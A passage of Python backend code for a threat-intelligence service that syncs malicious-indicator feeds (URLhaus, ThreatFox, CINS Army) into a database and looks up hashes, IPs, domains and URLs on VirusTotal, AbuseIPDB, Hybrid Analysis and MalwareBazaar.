    """Pulls the URLhaus recent JSON feed (last ~1000 malicious URLs) and
    upserts each URL into the curated IOC DB with malware-family attribution
    where available."""
    added = updated = skipped = 0
    try:
        async with httpx.AsyncClient(timeout=25, follow_redirects=True, headers=_abusech_headers()) as hc:
            r = await hc.get(URLHAUS_RECENT_JSON)
            if r.status_code != 200:
                summary = {"error": f"HTTP {r.status_code}", "synced_at": now_iso()}
                await db.sync_meta.update_one({"_id": "urlhaus"}, {"$set": summary}, upsert=True)
                return summary
            payload = r.json() or {}
        entries = []
        # URLhaus recent feed returns {"<id>": [{...}]} shape
        for k, v in payload.items():
            if isinstance(v, list):
                entries.extend(v)
            elif isinstance(v, dict):
                entries.append(v)
        entries = entries[:max_items]
        for e in entries:
            url = (e.get("url") or "").strip()
            if not url or _classify_ioc(url) != "url":
                skipped += 1
                continue
            malware = e.get("threat") or e.get("tags") or []
            if isinstance(malware, list):
                threat_name = ", ".join([str(t) for t in malware][:5]) or "URLhaus malicious URL"
            else:
                threat_name = str(malware) or "URLhaus malicious URL"
            tags = ["urlhaus", "abuse.ch", "malicious-url"]
            if e.get("threat"):
                tags.append(f"threat:{e.get('threat')}")
            try:
                _, created = await _upsert_ioc(url, threat_name, tags, "URLhaus", "high",
                                                f"URLhaus ref: {e.get('urlhaus_reference', '')}".strip(),
                                                ttl_days=60)
                added += 1 if created else 0
                updated += 0 if created else 1
            except Exception:
                skipped += 1
    except Exception as e:
        summary = {"error": str(e)[:200], "synced_at": now_iso()}
        try:
            await db.sync_meta.update_one({"_id": "urlhaus"}, {"$set": summary}, upsert=True)
        except Exception:
            pass
        logger.warning(f"URLhaus sync failed: {e}")
        return summary
    summary = {"items": len(entries), "added": added, "updated": updated, "skipped": skipped, "synced_at": now_iso()}
    try:
        await db.sync_meta.update_one({"_id": "urlhaus"}, {"$set": summary}, upsert=True)
    except Exception:
        pass
    logger.info(f"URLhaus sync complete: {summary}")
    return summary


async def _sync_threatfox_feed(days: int = 1, max_items: int = 2500) -> dict:
    """Pulls the abuse.ch ThreatFox recent-IOC feed via their POST API.
    Returns hashes, URLs, domains, IPs — each tagged with a malware family.
    Requires ABUSECH_AUTH_KEY (free from https://auth.abuse.ch/) since 2025."""
    if not ABUSECH_AUTH_KEY:
        summary = {"status": "not_configured",
                   "message": "Set ABUSECH_AUTH_KEY (free from auth.abuse.ch) to enable ThreatFox",
                   "synced_at": now_iso()}
        try:
            await db.sync_meta.update_one({"_id": "threatfox"}, {"$set": summary}, upsert=True)
        except Exception:
            pass
        return summary
    added = updated = skipped = 0
    try:
        async with httpx.AsyncClient(timeout=25, follow_redirects=True, headers=_abusech_headers()) as hc:
            r = await hc.post(THREATFOX_RECENT_JSON, json={"query": "get_iocs", "days": days})
            if r.status_code != 200:
                summary = {"error": f"HTTP {r.status_code}", "synced_at": now_iso()}
                await db.sync_meta.update_one({"_id": "threatfox"}, {"$set": summary}, upsert=True)
                return summary
            data = r.json() or {}
        if data.get("query_status") != "ok":
            summary = {"error": f"threatfox query_status={data.get('query_status')}", "synced_at": now_iso()}
            await db.sync_meta.update_one({"_id": "threatfox"}, {"$set": summary}, upsert=True)
            return summary
        entries = (data.get("data") or [])[:max_items]
        for e in entries:
            val = (e.get("ioc") or "").strip()
            if not val or _classify_ioc(val) == "unknown":
                skipped += 1
                continue
            family = e.get("malware_printable") or e.get("malware") or "ThreatFox IOC"
            confidence = e.get("confidence_level") or 0
            tags = ["threatfox", "abuse.ch"]
            if e.get("malware"):
                tags.append(f"family:{e.get('malware')}")
            if e.get("threat_type"):
                tags.append(f"type:{e.get('threat_type')}")
            severity = "critical" if confidence >= 90 else ("high" if confidence >= 75 else "medium")
            try:
                _, created = await _upsert_ioc(val, family, tags, "ThreatFox", severity,
                                                f"ThreatFox first-seen: {e.get('first_seen', '')}",
                                                ttl_days=60)
                added += 1 if created else 0
                updated += 0 if created else 1
            except Exception:
                skipped += 1
    except Exception as e:
        summary = {"error": str(e)[:200], "synced_at": now_iso()}
        try:
            await db.sync_meta.update_one({"_id": "threatfox"}, {"$set": summary}, upsert=True)
        except Exception:
            pass
        logger.warning(f"ThreatFox sync failed: {e}")
        return summary
    summary = {"items": len(entries), "added": added, "updated": updated, "skipped": skipped, "synced_at": now_iso()}
    try:
        await db.sync_meta.update_one({"_id": "threatfox"}, {"$set": summary}, upsert=True)
    except Exception:
        pass
    logger.info(f"ThreatFox sync complete: {summary}")
    return summary


async def _sync_cins_army(max_items: int = 5000) -> dict:
    """CINS Army list — Sentinel IPS-published bad-actor IPs (attackers observed
    across multiple honeypots).  ~15k IPs, no key required."""
    added = updated = skipped = total = 0
    try:
        async with httpx.AsyncClient(timeout=25, follow_redirects=True, headers={"User-Agent": "NivX-ThreatIntel/1.0"}) as hc:
            r = await hc.get(CINS_ARMY_LIST)
            if r.status_code != 200:
                summary = {"error": f"HTTP {r.status_code}", "synced_at": now_iso()}
                await db.sync_meta.update_one({"_id": "cins_army"}, {"$set": summary}, upsert=True)
                return summary
            for line in r.text.splitlines():
                s = line.strip()
                if not s or s.startswith("#"):
                    continue
                if _classify_ioc(s) != "ip":
                    continue
                total += 1
                if total > max_items:
                    break
                try:
                    _, created = await _upsert_ioc(s, "CINS Army bad-actor IP", ["cins-army", "sentinel-ips", "attacker-ip"],
                                                    "CINS Army", "high", "Observed attacking Sentinel IPS honeypots",
                                                    ttl_days=60)
                    added += 1 if created else 0
                    updated += 0 if created else 1
                except Exception:
                    skipped += 1
    except Exception as e:
        summary = {"error": str(e)[:200], "synced_at": now_iso()}
        try:
            await db.sync_meta.update_one({"_id": "cins_army"}, {"$set": summary}, upsert=True)
        except Exception:
            pass
        logger.warning(f"CINS Army sync failed: {e}")
        return summary
    summary = {"items": total, "added": added, "updated": updated, "skipped": skipped, "synced_at": now_iso()}
    try:
        await db.sync_meta.update_one({"_id": "cins_army"}, {"$set": summary}, upsert=True)
    except Exception:
        pass
    logger.info(f"CINS Army sync complete: {summary}")
    return summary


# ---------------------------------------------------------------------------
# Multi-source curated-IOC sync orchestrator (One-click "Sync all sources")
# ---------------------------------------------------------------------------
SYNC_SOURCES = [
    # key,             display name,        can_sync, reason_if_not
    ("otx",             "AlienVault OTX",    True,  None),
    ("hybrid_analysis", "Hybrid Analysis",   True,  None),
    ("abuseipdb",       "AbuseIPDB",         True,  None),
    ("malwarebazaar",   "MalwareBazaar",     True,  None),
    ("malwarebytes",    "Malwarebytes Labs", True,  None),
    ("virustotal",      "VirusTotal (Enterprise)", True, None),
    ("talos",           "Talos-Community Blocklists (ET + Feodo)", True,  None),
    ("urlhaus",         "URLhaus (abuse.ch)", True, None),
    ("threatfox",       "ThreatFox (abuse.ch)", True, None),
    ("cins_army",       "CINS Army (Sentinel IPS)", True, None),
    ("urlscan",         "URLScan.io",        False, "Bulk 'malicious verdicts' search requires urlscan Pro"),
    ("shodan",          "Shodan",            False, "Not a curated IOC feed (internet scan engine)"),
]


@api_router.get("/iocs/sync-status")
async def iocs_sync_status():
    metas = {}
    async for doc in db.sync_meta.find({}, {"_id": 1, "items": 1, "pulses": 1, "indicators": 1, "added": 1, "updated": 1, "skipped": 1, "synced_at": 1, "error": 1}):
        metas[doc["_id"]] = {k: v for k, v in doc.items() if k != "_id"}
    # OTX still has its own doc under otx_meta for backwards-compat.
    otx_doc = await db.otx_meta.find_one({"_id": "last_sync"}, {"_id": 0})
    if otx_doc and "otx" not in metas:
        metas["otx"] = otx_doc

    key_map = {
        "otx": bool(OTX_API_KEY),
        "hybrid_analysis": bool(HYBRID_ANALYSIS_API_KEY),
        "abuseipdb": bool(ABUSEIPDB_API_KEY),
        "malwarebazaar": bool(MALWAREBAZAAR_API_KEY),
        "malwarebytes": True,
        "urlscan": bool(URLSCAN_API_KEY) if 'URLSCAN_API_KEY' in globals() else False,
        "virustotal": bool(VT_API_KEY) if 'VT_API_KEY' in globals() else False,
        "talos": True,
        "urlhaus": True,                          # abuse.ch — auth key optional
        "threatfox": bool(ABUSECH_AUTH_KEY),      # requires ABUSECH_AUTH_KEY since May 2025
        "cins_army": True,                        # sentinel IPS — no key needed
        "shodan": False,
    }
    sources = []
    for key, label, can_sync, reason in SYNC_SOURCES:
        sources.append({
            "key": key,
            "label": label,
            "can_sync": can_sync,
            "reason": reason,
            "configured": key_map.get(key, False),
            "last_sync": metas.get(key),
        })
    return {"sources": sources}


@api_router.post("/iocs/sync-all")
async def iocs_sync_all(user: dict = Depends(get_current_user)):
    """One-click sync across every source that provides a bulk IOC feed.
    Runs OTX + Hybrid Analysis + AbuseIPDB + MalwareBazaar + Malwarebytes +
    VT Enterprise + Cisco Talos in parallel. Sources without a public bulk
    feed (URLScan / Shodan) are reported as skipped."""
    tasks = {
        "otx": _sync_otx_pulses() if OTX_API_KEY else None,
        "hybrid_analysis": _sync_hybrid_analysis_feed() if HYBRID_ANALYSIS_API_KEY else None,
        "abuseipdb": _sync_abuseipdb_blacklist() if ABUSEIPDB_API_KEY else None,
        "malwarebazaar": _sync_malwarebazaar_recent() if MALWAREBAZAAR_API_KEY else None,
        "malwarebytes": _sync_malwarebytes_iocs(),
        "virustotal": _sync_virustotal_intel() if VT_API_KEY else None,
        "talos": _sync_talos_blocklist(),
    }
    active_keys = [k for k, v in tasks.items() if v is not None]
    results_list = await asyncio.gather(*[tasks[k] for k in active_keys], return_exceptions=True)
    results: dict = {}
    total_added = total_updated = 0
    for k, r in zip(active_keys, results_list):
        if isinstance(r, Exception):
            results[k] = {"error": str(r)}
        else:
            results[k] = r
            total_added += int(r.get("added") or 0)
            total_updated += int(r.get("updated") or 0)

    # Fill in skipped sources so the client can render a complete status.
    for key, label, can_sync, reason in SYNC_SOURCES:
        if key in results:
            continue
        if not can_sync:
            results[key] = {"skipped": True, "reason": reason}
        else:
            results[key] = {"error": f"{label} is not configured"}

    return {
        "totals": {"added": total_added, "updated": total_updated},
        "results": results,
        "synced_at": now_iso(),
    }





# ---------------------------------------------------------------------------
# Live external threat feed (CISA Known Exploited Vulnerabilities)
# ---------------------------------------------------------------------------
_feed_cache: dict[str, Any] = {"ts": None, "data": None}


# ---------------------------------------------------------------------------
# Smart IOC lookup / enrichment (key-free sources + prefilled deep links)
# ---------------------------------------------------------------------------
def _classify_ioc(value: str) -> str:
    v = value.strip()
    if re.fullmatch(r"[a-fA-F0-9]{64}", v):
        return "sha256"
    if re.fullmatch(r"[a-fA-F0-9]{40}", v):
        return "sha1"
    if re.fullmatch(r"[a-fA-F0-9]{32}", v):
        return "md5"
    if re.fullmatch(r"(\d{1,3}\.){3}\d{1,3}", v):
        return "ip"
    if v.lower().startswith(("http://", "https://")):
        return "url"
    if re.fullmatch(r"([a-zA-Z0-9-]+\.)+[a-zA-Z]{2,}", v.replace("[.]", ".")):
        return "domain"
    return "unknown"


def _ioc_links(value: str, kind: str) -> dict:
    v = value.strip().replace("[.]", ".")
    from urllib.parse import quote
    q = quote(v, safe="")
    links = {}
    if kind in ("md5", "sha1", "sha256"):
        links["VirusTotal"] = f"https://www.virustotal.com/gui/file/{v}"
        links["MalwareBazaar"] = f"https://bazaar.abuse.ch/browse.php?search={kind}%3A{v}"
        links["ThreatFox"] = f"https://threatfox.abuse.ch/browse.php?search=hash%3A{v}"
        links["Hybrid Analysis"] = f"https://www.hybrid-analysis.com/search?query={v}"
        links["IBM X-Force"] = f"https://exchange.xforce.ibmcloud.com/malware/{v}"
    elif kind == "ip":
        links["VirusTotal"] = f"https://www.virustotal.com/gui/ip-address/{v}"
        links["AbuseIPDB"] = f"https://www.abuseipdb.com/check/{v}"
        links["Cisco Talos"] = f"https://talosintelligence.com/reputation_center/lookup?search={v}"
        links["Shodan"] = f"https://www.shodan.io/host/{v}"
        links["GreyNoise"] = f"https://viz.greynoise.io/ip/{v}"
        links["IBM X-Force"] = f"https://exchange.xforce.ibmcloud.com/ip/{v}"
    elif kind == "domain":
        links["VirusTotal"] = f"https://www.virustotal.com/gui/domain/{v}"
        links["urlscan.io"] = f"https://urlscan.io/search/#{q}"
        links["Cisco Talos"] = f"https://talosintelligence.com/reputation_center/lookup?search={v}"
        links["Shodan"] = f"https://www.shodan.io/search?query=hostname%3A{v}"
        links["IBM X-Force"] = f"https://exchange.xforce.ibmcloud.com/url/{v}"
    elif kind == "url":
        links["VirusTotal"] = f"https://www.virustotal.com/gui/search/{q}"
        links["urlscan.io"] = f"https://urlscan.io/search/#{q}"
        links["IBM X-Force"] = f"https://exchange.xforce.ibmcloud.com/url/{q}"
    return links


# ---------------------------------------------------------------------------
# Optional key-based reputation providers (VirusTotal v3 + AbuseIPDB v2)
# Keys are OPTIONAL: absent keys are skipped gracefully. Results are cached in
# MongoDB (ioc_cache) for 6h to conserve free-tier daily quotas.
# ---------------------------------------------------------------------------
VT_API_KEY = os.environ.get("VIRUSTOTAL_API_KEY")
ABUSEIPDB_API_KEY = os.environ.get("ABUSEIPDB_API_KEY")
URLSCAN_API_KEY = os.environ.get("URLSCAN_API_KEY")
EMERGENT_LLM_KEY = os.environ.get("EMERGENT_LLM_KEY")
HYBRID_ANALYSIS_API_KEY = os.environ.get("HYBRID_ANALYSIS_API_KEY")
MALWAREBAZAAR_API_KEY = os.environ.get("MALWAREBAZAAR_API_KEY")
_MB_URL = "https://mb-api.abuse.ch/api/v1/"
_HA_BASE = "https://hybrid-analysis.com/api/v2"  # non-www — www 301-redirects and Cloudflare drops POST bodies
_HA_HEADERS = {"api-key": HYBRID_ANALYSIS_API_KEY or "", "User-Agent": "Falcon Sandbox", "Accept": "application/json"}
_REP_TTL = timedelta(hours=6)


async def _mb_hash_lookup(hc: httpx.AsyncClient, hash_value: str) -> Optional[dict]:
    """MalwareBazaar `get_info` lookup. Accepts SHA256/SHA1/MD5.
    Returns None when disabled, or an enrichment dict on success:
      {found, sha256, sha1, md5, signature, file_name, file_type, file_size,
       first_seen, tags[], delivery_method, intelligence, reporter, url}
    """
    if not MALWAREBAZAAR_API_KEY:
        return None
    if _classify_ioc(hash_value) not in ("sha256", "sha1", "md5"):
        return {"skipped": True, "reason": "hash_required"}
    try:
        r = await hc.post(
            _MB_URL,
            data={"query": "get_info", "hash": hash_value},
            headers={"Auth-Key": MALWAREBAZAAR_API_KEY},
            timeout=15,
        )
        if r.status_code != 200:
            return {"error": f"MB HTTP {r.status_code}"}
        j = r.json() or {}
        status = j.get("query_status")
        if status in ("hash_not_found", "no_results"):
            return {"found": False}
        if status not in ("ok",):
            return {"error": f"MB status={status}"}
        data = (j.get("data") or [])
        if not data:
            return {"found": False}
        d = data[0] or {}
        return {
            "found": True,
            "sha256": d.get("sha256_hash"),
            "sha1": d.get("sha1_hash"),
            "md5": d.get("md5_hash"),
            "signature": d.get("signature"),
            "file_name": d.get("file_name"),
            "file_type": d.get("file_type"),
            "file_size": d.get("file_size"),
            "first_seen": d.get("first_seen"),
            "last_seen": d.get("last_seen"),
            "tags": d.get("tags") or [],
            "delivery_method": d.get("delivery_method"),
            "intelligence": {
                "downloads": (d.get("intelligence") or {}).get("downloads"),
                "uploads": (d.get("intelligence") or {}).get("uploads"),
            } if d.get("intelligence") else None,
            "reporter": d.get("reporter"),
            "url": f"https://bazaar.abuse.ch/sample/{d.get('sha256_hash')}/" if d.get("sha256_hash") else None,
        }
    except Exception as e:
        return {"error": f"MB error: {e}"}


async def _mb_get_recent(hc: httpx.AsyncClient, selector: int = 100) -> dict:
    """MalwareBazaar `get_recent` — last N sample submissions. Returns raw sample list."""
    if not MALWAREBAZAAR_API_KEY:
        return {"error": "MALWAREBAZAAR_API_KEY not configured", "samples": []}
    try:
        r = await hc.post(
            _MB_URL,
            data={"query": "get_recent", "selector": str(selector)},
            headers={"Auth-Key": MALWAREBAZAAR_API_KEY},
            timeout=25,
        )
        if r.status_code != 200:
            return {"error": f"MB HTTP {r.status_code}", "samples": []}
        j = r.json() or {}
        return {"query_status": j.get("query_status"), "samples": j.get("data") or []}
    except Exception as e:
        return {"error": f"MB error: {e}", "samples": []}


async def _ha_hash_lookup(hc: httpx.AsyncClient, hash_value: str) -> Optional[dict]:
    """Look up a hash on Hybrid Analysis. Uses /overview/{sha256} (v2 replacement
    for deprecated /search/hash). Returns None when disabled, {'skipped':True} for
    non-SHA256 hashes since HA overview requires SHA256."""
    if not HYBRID_ANALYSIS_API_KEY:
        return None
    kind = _classify_ioc(hash_value)
    if kind != "sha256":
        return {"skipped": True, "reason": "sha256_required"}
    try:
        r = await hc.get(
            f"{_HA_BASE}/overview/{hash_value}",
            headers=_HA_HEADERS,
            follow_redirects=True,
        )
        if r.status_code == 401:
            return {"error": "unauthorized"}
        if r.status_code == 429:
            return {"error": "rate_limited"}
        if r.status_code == 404:
            return {"found": False}
        if r.status_code != 200:
            return {"error": "request_failed"}
        d = r.json() or {}
        if not d.get("sha256"):
            return {"found": False}
        # Pick top vx_family from scanners[].family if present.
        family = None
        for sc in (d.get("scanners") or []):
            if sc.get("family"):
                family = sc["family"]
                break
        classification = d.get("classification_tags") or []
        return {
            "found": True,
            "verdict": d.get("verdict"),
            "threat_score": d.get("threat_score"),
            "vx_family": family,
            "classification": classification[:5],
            "type_short": d.get("type_short"),
            "last_file_name": d.get("last_file_name"),
            "size": d.get("size"),
            "reports": len(d.get("children") or []) + 1,
            "url": f"https://www.hybrid-analysis.com/sample/{d['sha256']}",
            "submitted_at": d.get("last_multi_scan") or d.get("analysis_start_time"),
        }
    except Exception:
        return {"error": "request_failed"}


async def _ha_search_terms(hc: httpx.AsyncClient, params: dict, limit: int = 12) -> Optional[dict]:
    """Search HA for sandboxed samples matching the given terms (host/domain/url/etc).
    `params` is a dict like {'host': '1.2.3.4'} or {'domain': 'example.com'}.
    Returns normalized {count, families:[...], samples:[...]} or None if disabled."""
    if not HYBRID_ANALYSIS_API_KEY:
        return None
    try:
        r = await hc.post(f"{_HA_BASE}/search/terms", data=params, headers={**_HA_HEADERS, "Content-Type": "application/x-www-form-urlencoded"})
        if r.status_code == 401:
            return {"error": "unauthorized"}
        if r.status_code == 429:
            return {"error": "rate_limited"}
        if r.status_code != 200:
            return {"error": "request_failed"}
        j = r.json() or {}
        results = j.get("result") or []
        if not results:
            return {"found": False, "count": 0, "families": [], "samples": []}
        # Aggregate families
        fam_counts: dict = {}
        for x in results:
            f = (x.get("vx_family") or "").strip()
            if f:
                fam_counts[f] = fam_counts.get(f, 0) + 1
        families = sorted([{"name": f, "count": c} for f, c in fam_counts.items()], key=lambda x: x["count"], reverse=True)[:5]
        samples = []
        for x in results[:limit]:
            samples.append({
                "sha256": x.get("sha256"),
                "verdict": x.get("verdict"),
                "threat_score": x.get("threat_score"),
                "vx_family": x.get("vx_family"),
                "av_detect": x.get("av_detect"),
                "submit_name": x.get("submit_name"),
                "environment": x.get("environment_description") or x.get("environment_id"),
                "analysis_start_time": x.get("analysis_start_time"),
                "url": f"https://www.hybrid-analysis.com/sample/{x.get('sha256')}" if x.get("sha256") else None,
            })
        # Overall malicious count
        malicious = sum(1 for x in results if (x.get("verdict") or "").lower() == "malicious")
        return {
            "found": True,
            "count": j.get("count") or len(results),
            "malicious": malicious,
            "families": families,
            "samples": samples,
        }
    except Exception:
        return {"error": "request_failed"}


async def _ha_quick_scan_url(hc: httpx.AsyncClient, url_value: str, scan_type: str = "all") -> dict:
    """Submit a URL for shallow multi-scanner analysis. Returns normalized verdict."""
    if not HYBRID_ANALYSIS_API_KEY:
        return {"error": "not_configured"}
    try:
        r = await hc.post(
            f"{_HA_BASE}/quick-scan/url",
            data={"url": url_value, "scan_type": scan_type},
            headers={**_HA_HEADERS, "Content-Type": "application/x-www-form-urlencoded"},
            timeout=30,
        )
        if r.status_code == 401:
            return {"error": "unauthorized"}
        if r.status_code == 429:
            return {"error": "rate_limited"}
        if r.status_code >= 400:
            try:
                return {"error": "invalid_input", "detail": r.json()}
            except Exception:
                return {"error": "request_failed"}
        j = r.json() or {}
        scanners = j.get("scanners") or []
        # Normalize scanner rows.
        rows = []
        malicious_hits = 0
        for s in scanners:
            positives = s.get("positives")
            is_mal = (positives is not None and positives > 0)
            if is_mal:
                malicious_hits += 1
            rows.append({
                "name": s.get("name"),
                "status": s.get("status"),
                "positives": positives,
                "total": s.get("total"),
                "percent": s.get("percent"),
                "error_message": s.get("error_message"),
            })
        verdict = "malicious" if malicious_hits >= 2 else ("suspicious" if malicious_hits == 1 else "no threat")
        return {
            "id": j.get("id"),
            "sha256": j.get("sha256"),
            "submission_type": j.get("submission_type"),
            "verdict": verdict,
            "malicious_scanners": malicious_hits,
            "total_scanners": len(scanners),
            "scanners": rows,
            "reports_count": len(j.get("reports") or []),
            "report_url": f"https://www.hybrid-analysis.com/sample/{j['sha256']}" if j.get("sha256") else None,
        }
    except Exception as e:
        logger.warning(f"HA quick scan error: {e}")
        return {"error": "request_failed"}


class HaUrlInput(BaseModel):
    url: str
    scan_type: str = "all"


@api_router.post("/hybrid/quick-scan-url")
async def hybrid_quick_scan_url(payload: HaUrlInput):
    if not HYBRID_ANALYSIS_API_KEY:
        raise HTTPException(status_code=503, detail="Hybrid Analysis is not configured")
    url_value = (payload.url or "").strip()
    if not url_value or not url_value.lower().startswith(("http://", "https://")):
        raise HTTPException(status_code=422, detail="Provide a valid http(s) URL")
    async with httpx.AsyncClient(timeout=35, follow_redirects=True) as hc:
        result = await _ha_quick_scan_url(hc, url_value, payload.scan_type or "all")
    if result.get("error"):
        raise HTTPException(status_code=502, detail=f"Hybrid Analysis error: {result['error']}")
    return result


class HaSearchInput(BaseModel):
    value: str
    limit: int = 15


@api_router.post("/hybrid/search-samples")
async def hybrid_search_samples(payload: HaSearchInput):
    """Return sandboxed samples on Hybrid Analysis that observed/contacted the
    given host, domain, IP or URL. Powers the 'Sandboxed samples that contacted
    this' enrichment panel in the IOC Analyzer."""
    if not HYBRID_ANALYSIS_API_KEY:
        raise HTTPException(status_code=503, detail="Hybrid Analysis is not configured")
    raw = (payload.value or "").strip()
    if not raw:
        raise HTTPException(status_code=422, detail="value is required")
    # Normalize + choose the right HA search term based on IOC kind.
    from urllib.parse import urlparse
    normalized = raw
    kind = _classify_ioc(raw)
    if kind == "url":
        # Extract host from URL for a broader match (HA "host" indexes samples that resolved/connected to that host).
        try:
            parsed = urlparse(raw)
            host = (parsed.hostname or "").strip()
        except Exception:
            host = ""
        if not host:
            raise HTTPException(status_code=422, detail="Invalid URL")
        params = {"host": host}
        normalized = host
        term = "host"
    elif kind == "ip":
        params = {"host": raw}
        term = "host"
    elif kind == "domain":
        params = {"domain": raw}
        term = "domain"
    else:
        raise HTTPException(status_code=422, detail="Only IP, domain or URL indicators are supported")

    limit = max(1, min(int(payload.limit or 15), 40))
    async with httpx.AsyncClient(timeout=25, follow_redirects=True) as hc:
        result = await _ha_search_terms(hc, params, limit=limit)
    if result is None:
        raise HTTPException(status_code=503, detail="Hybrid Analysis is not configured")
    if result.get("error"):
        raise HTTPException(status_code=502, detail=f"Hybrid Analysis error: {result['error']}")
    return {"queried": normalized, "term": term, **result}


class HaLookupInput(BaseModel):
    value: str
    limit: int = 12


@api_router.post("/hybrid/lookup")
async def hybrid_lookup(payload: HaLookupInput):
    """Universal Hybrid Analysis lookup — auto-classifies the input and routes to
    the right HA endpoint. Powers the on-page 'HA IOC Analyzer' so a single
    input box can handle URLs, file hashes, IPs and domains.

    Returns a unified envelope: {kind, value, result: {...}} where the shape of
    `result` depends on `kind`:
      - url:            {verdict, malicious_scanners, total_scanners, scanners[], report_url, reports_count}
      - sha256/sha1/md5:{found, verdict, threat_score, vx_family, classification[], reports, url, submitted_at}
      - ip / domain:    {count, malicious, families[], samples[]}
    """
    if not HYBRID_ANALYSIS_API_KEY:
        raise HTTPException(status_code=503, detail="Hybrid Analysis is not configured")
    raw = (payload.value or "").strip()
    if not raw:
        raise HTTPException(status_code=422, detail="value is required")

    kind = _classify_ioc(raw)
    async with httpx.AsyncClient(timeout=35, follow_redirects=True) as hc:
        if kind == "url":
            result = await _ha_quick_scan_url(hc, raw, "all")
            if result.get("error"):
                raise HTTPException(status_code=502, detail=f"Hybrid Analysis error: {result['error']}")
            return {"kind": "url", "value": raw, "result": result}

        if kind in ("sha256", "sha1", "md5"):
            result = await _ha_hash_lookup(hc, raw)
            if not result:
                raise HTTPException(status_code=503, detail="Hybrid Analysis is not configured")
            if result.get("skipped"):
                # HA overview only supports SHA256 — surface that clearly.
                raise HTTPException(status_code=422, detail=f"Hybrid Analysis /overview supports SHA256 only. You provided a {kind.upper()}. Provide the SHA256 (or run VT/URLScan via the OSINT analyzer above).")
            if result.get("error"):
                raise HTTPException(status_code=502, detail=f"Hybrid Analysis error: {result['error']}")
            return {"kind": kind, "value": raw, "result": result}

        if kind in ("ip", "domain"):
            from urllib.parse import urlparse  # noqa: F401 (kept for symmetry / future)
            params = {"host": raw} if kind == "ip" else {"domain": raw}
            limit = max(1, min(int(payload.limit or 12), 40))
            result = await _ha_search_terms(hc, params, limit=limit)
            if result is None:
                raise HTTPException(status_code=503, detail="Hybrid Analysis is not configured")
            if result.get("error"):
                raise HTTPException(status_code=502, detail=f"Hybrid Analysis error: {result['error']}")
            return {"kind": kind, "value": raw, "result": result}

        raise HTTPException(status_code=422, detail=f"Unsupported IOC type ({kind or 'unknown'}). Provide a URL, SHA256/SHA1/MD5 hash, IP address, or domain.")



def _vt_url_id(u: str) -> str:
    import base64
    return base64.urlsafe_b64encode(u.encode("utf-8")).decode("utf-8").strip("=")


async def _vt_lookup(hc: httpx.AsyncClient, kind: str, normalized: str) -> Optional[dict]:
    if not VT_API_KEY:
        return None
    if kind == "ip":
        path = f"ip_addresses/{normalized}"
    elif kind == "domain":
        path = f"domains/{normalized}"
    elif kind == "url":
        path = f"urls/{_vt_url_id(normalized)}"
    else:
        path = f"files/{normalized}"
    try:
        r = await hc.get(f"https://www.virustotal.com/api/v3/{path}", headers={"x-apikey": VT_API_KEY, "accept": "application/json"})
        if r.status_code == 404:
            return {"found": False, "malicious": 0, "suspicious": 0, "harmless": 0, "undetected": 0, "total": 0, "reputation": None}
        if r.status_code == 401:
            return {"error": "unauthorized"}
        if r.status_code == 429:
            return {"error": "rate_limited"}
        if r.status_code != 200:
            return {"error": f"http_{r.status_code}"}
        attrs = ((r.json() or {}).get("data") or {}).get("attributes") or {}
        stats = attrs.get("last_analysis_stats") or {}
        mal = stats.get("malicious", 0) or 0
        susp = stats.get("suspicious", 0) or 0
        harm = stats.get("harmless", 0) or 0
        undet = stats.get("undetected", 0) or 0
        total = mal + susp + harm + undet + (stats.get("timeout", 0) or 0)
        ptc = attrs.get("popular_threat_classification") or {}
        threat_categories = [c.get("value") for c in (ptc.get("popular_threat_category") or []) if c.get("value")]
        return {
            "found": True,
            "malicious": mal,
            "suspicious": susp,
            "harmless": harm,
            "undetected": undet,
            "total": total,
            "reputation": attrs.get("reputation"),
            "label": attrs.get("meaningful_name") or attrs.get("type_description"),
            "last_analysis_date": attrs.get("last_analysis_date"),
            "threat_label": ptc.get("suggested_threat_label"),
            "threat_categories": threat_categories[:6],
            "tags": (attrs.get("tags") or [])[:10],
        }
    except Exception:
        return {"error": "request_failed"}


async def _abuseipdb_lookup(hc: httpx.AsyncClient, normalized: str) -> Optional[dict]:
    if not ABUSEIPDB_API_KEY:
        return None
    try:
        r = await hc.get(
            "https://api.abuseipdb.com/api/v2/check",
            headers={"Key": ABUSEIPDB_API_KEY, "Accept": "application/json"},
            params={"ipAddress": normalized, "maxAgeInDays": "90"},
        )
        if r.status_code == 401:
            return {"error": "unauthorized"}
        if r.status_code == 429:
            return {"error": "rate_limited"}
        if r.status_code != 200:
            return {"error": f"http_{r.status_code}"}
        d = (r.json() or {}).get("data") or {}
        return {
            "score": d.get("abuseConfidenceScore"),
            "reports": d.get("totalReports"),
            "country": d.get("countryCode"),
            "isp": d.get("isp"),
            "domain": d.get("domain"),
            "whitelisted": d.get("isWhitelisted"),
        }
    except Exception:
        return {"error": "request_failed"}


async def _reputation(hc: httpx.AsyncClient, kind: str, normalized: str) -> Optional[dict]:
    """VT + AbuseIPDB + Hybrid Analysis + MalwareBazaar reputation with 6h Mongo cache.
    Also runs Hybrid Analysis URL quick-scan for URL inputs. Returns None when no keys set."""
    if not (VT_API_KEY or ABUSEIPDB_API_KEY or HYBRID_ANALYSIS_API_KEY or MALWAREBAZAAR_API_KEY):
        return None
    cache_key = f"{kind}:{normalized}"
    try:
        doc = await db.ioc_cache.find_one({"_id": cache_key})
        if doc and doc.get("ts"):
            if datetime.now(timezone.utc) - datetime.fromisoformat(doc["ts"]) < _REP_TTL:
                return doc.get("reputation")
    except Exception:
        pass
    rep = {"vt": await _vt_lookup(hc, kind, normalized), "abuseipdb": None, "hybrid_analysis": None, "malwarebazaar": None}
    if kind == "ip":
        rep["abuseipdb"] = await _abuseipdb_lookup(hc, normalized)
    if kind in ("md5", "sha1", "sha256"):
        # Run HA (sha256 only) + MalwareBazaar (all three hash types) in parallel.
        ha_task = _ha_hash_lookup(hc, normalized)
        mb_task = _mb_hash_lookup(hc, normalized)
        ha, mb = await asyncio.gather(ha_task, mb_task)
        rep["hybrid_analysis"] = ha
        rep["malwarebazaar"] = mb
    if kind == "url":
        # Fold HA URL quick-scan into the unified analyzer for URL inputs.
        try:
            rep["hybrid_analysis"] = await _ha_quick_scan_url(hc, normalized, "all")
        except Exception as e:
            logger.warning(f"HA quick-scan failed for {normalized}: {e}")
    try:
        await db.ioc_cache.update_one({"_id": cache_key}, {"$set": {"reputation": rep, "ts": now_iso()}}, upsert=True)
    except Exception:
        pass
    return rep


async def _urlscan_get_with_backoff(hc: httpx.AsyncClient, url: str, headers: dict, tries: int = 3) -> Optional[httpx.Response]:
    """GET with automatic backoff on urlscan 429/503. Returns None if all retries fail."""
    import asyncio as _asyncio
    delay = 1.5
    for i in range(tries):
        try:
